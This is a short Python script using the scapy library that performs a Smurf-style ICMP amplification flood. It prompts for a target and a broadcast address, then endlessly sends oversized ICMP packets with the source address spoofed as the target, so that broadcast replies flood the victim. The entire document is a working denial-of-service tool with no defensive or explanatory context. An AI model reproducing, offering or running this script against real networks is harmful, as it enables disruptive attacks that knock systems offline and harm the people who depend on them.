from scapy.all import *
import random

target = raw_input("Enter the target to attack: ")
broadcast = raw_input("Enter the broadcast address to send to: ")

while True:
    ip_hdr = IP(src=target, dst=broadcast)
    packet = ip_hdr / ICMP() / ("Y" * 60000)
    send(packet)